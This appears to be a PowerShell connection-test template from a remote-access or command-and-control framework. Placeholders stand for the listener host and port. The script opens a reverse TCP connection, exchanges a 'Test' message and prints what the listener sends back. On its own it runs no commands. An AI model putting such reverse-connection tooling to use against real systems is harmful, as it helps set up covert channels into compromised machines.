
$CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
$CONNECTHOST = "SYREPLACE_CONNECTHOST"
$CONNECTPORT = "SYREPLACE_CONNECTPORT"

if ($CONNECTIONMETHOD -eq "TCP") {
    $transport = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
	$res = Message-ParseFromTransport $transport
	$res.content -join '' | Write-Output
	$message1 = Message-Create -MType 1 -Content "Test"
    Message-SendToTransport $message1 $transport
    $res = Message-ParseFromTransport $transport
	$res.content -join '' | Write-Output
    Transport-ReverseTcp-Close $transport
} else {
    Write-Output "ERROR: connection method not defined"
}

